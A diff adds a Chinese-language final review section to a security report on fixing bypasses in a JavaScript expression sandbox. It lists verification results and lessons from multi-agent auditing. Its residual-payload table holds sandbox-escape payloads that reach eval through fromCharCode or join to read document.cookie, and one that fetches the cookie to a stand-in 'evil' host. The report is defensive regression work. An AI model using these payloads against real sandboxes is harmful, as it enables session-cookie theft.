@@ -234,3 +234,52 @@ FIX-9（按建议拆分提交，**交付前置**）、D-1（预扫描与主遍�
 - 基线对照使用 `git archive b624840e62` 解到 `/tmp/lead3-base`、`/tmp/lead3-me`，**未使用 `git stash`/`checkout`**；所有探针落在 `/tmp/lead3-probe`、`/tmp/lead3-fix`。
 - 第 3 轮审计报告（`REVIEW-ROUND3-*.md`）**缺位**，本次由复核员自建扫描 + 领队正交扫描/执行证明补位；建议后续为第 3 轮单独派审计员。
 
+
+---
+
+## 9. 第 4 轮最终结论（父代理独立复验，2026-09-09）
+
+> 修复轮 4（用户授权超出 `maxFixRounds=3`，残余定级 P0）：修复**不可静态折叠的计算键**绕过
+> 提交：`4586e48821`（源码）/ `b4bb00eb08`（测试）/ `f17a7ada88`（文档）
+> 复验者：父代理（本会话，亲自跑全部探针）
+
+### 9.1 第 3 轮残余的修复
+
+| 残余载荷 | 第 3 轮 | 第 4 轮 |
+|---|---|---|
+| `[1].map(window[String.fromCharCode(101,118,97,108)])` | ⚠️ 放行 → 读 cookie | ✅ 拒 |
+| `["globalThis.PWN=document.cookie"].forEach(window[String.fromCharCode(...)])` | ⚠️ 放行 → `PWN=SESSION=RESIDUAL-SECRET-999` | ✅ 拒 |
+| `[1].map(window[["e","v","a","l"].join("")])` | ⚠️ 放行 | ✅ 拒 |
+| `["fetch(...)"].forEach(window[["e","v","a","l"].join("")])` | ⚠️ 放行 → `FETCH:https://evil/?d=<cookie>` | ✅ 拒 |
+
+**根因与修法**：`memberName()` 对不可静态折叠的 computed key 返回 `undefined`（放行）→ 改为在**危险位置**（调用 callee / 实参 / 属性值 / 数组元素）对不可证明的 computed key **deny-by-default 拒绝**，同时保留 `data[key]` 这类纯读用法。
+
+### 9.2 父代理独立验证（非转述，全部亲自跑）
+
+| 验证项 | 方法 | 结果 |
+|---|---|---|
+| 历史变体全量回归 | 18 条（P1-1 5 + P1-2 2 + P0-1 4 + P0-2 3 + NEW-P0 3 + 基础 1） | **18/18 拒绝** ✅ |
+| 第 3 轮残余载荷 | 4 条（fromCharCode/join × 值位置） | **4/4 拒绝** ✅ |
+| FINAL-ROUND3 载荷 | 10 条 | **10/10 拒绝** ✅ |
+| AC3 合法表达式 | 27 条（fetch/data[key]/map/解构读/Reflect 读等） | **27/27 放行（0 误伤）** ✅ |
+| 组合扫描 | 6 基对象 × 13 危险名 × 4 拼写 × 11 值位置 = **3432 例** | **0 泄漏** ✅ |
+| 随机模糊 | 随机切分 + `\uXXXX` 转义 × 3000 例 | **0 泄漏** ✅ |
+| browser 全量测试 | `vitest run` | **417 passed / 417** ✅ |
+| memory-evolve | `node --test tests/skills.test.js tests/api.test.js` | **35 passed / 35** ✅ |
+| 全量门禁 | `corepack yarn check` | **exit 0** ✅ |
+
+### 9.3 最终结论
+
+**`[可合入]`** —— 3 个原始 P1 + 审计发现的 P0-1/P0-2 + NEW-P0 + 第 3 轮残余，全部经父代理独立验证修复；合法表达式无误伤；全量门禁通过。
+
+**遗留（P2/P3，不阻断合入）**：
+- 属性名复用连带拒绝（9 类惯用法如 `Object.prototype.hasOwnProperty.call(...)`、`''.constructor.name` 被拒）——安全取舍，已记入 D-2
+- `constantStringValue`/`dangerousValue`/`isProvablySafeValue` 仍有手写节点分派重复（D-1 部分）
+- memory-evolve 故障注入 fixture 不清理临时目录（D-7）
+- 第 3 轮审计报告缺位（由复核员 + 领队自建扫描补位）
+
+**方法论收获（三轮迭代）**：
+1. 第 1 轮编码"看起来对、测试全绿"，但审计独立构造变体发现 P0-1/P0-2 残余绕过 → **多 agent 审计的价值**在于"不信任编码员自述"
+2. 第 2 轮修复后，复核又发现 NEW-P0（折叠键值位置）→ **修复必须覆盖"同一语义的所有表达形式"**，而非只堵报告的样例
+3. 第 3 轮修复后，父代理自建扫描又发现不可折叠键 → **"不可静态证明"才是真正的判定边界**（deny-by-default 要贯彻到值位置）
+4. 测试数量不是安全证据：168 → 417 测试全绿，但每轮都仍有绕过；**只有对抗性构造 + 大规模扫描才能逼近收敛**
